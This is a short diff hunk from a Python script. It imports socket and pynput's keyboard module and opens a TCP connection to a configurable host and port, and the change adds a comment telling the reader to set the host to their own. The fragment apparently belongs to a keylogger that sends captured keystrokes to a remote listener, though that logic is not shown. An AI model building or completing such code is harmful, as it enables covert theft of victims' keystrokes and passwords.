@@ -2,7 +2,7 @@ def main():
     import socket
     from pynput import keyboard
 
-    HOST = "192.168.50.1"
+    HOST = "192.168.50.1" # change the host to yours
     PORT = 4000
     FORMAT = "utf-8"
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
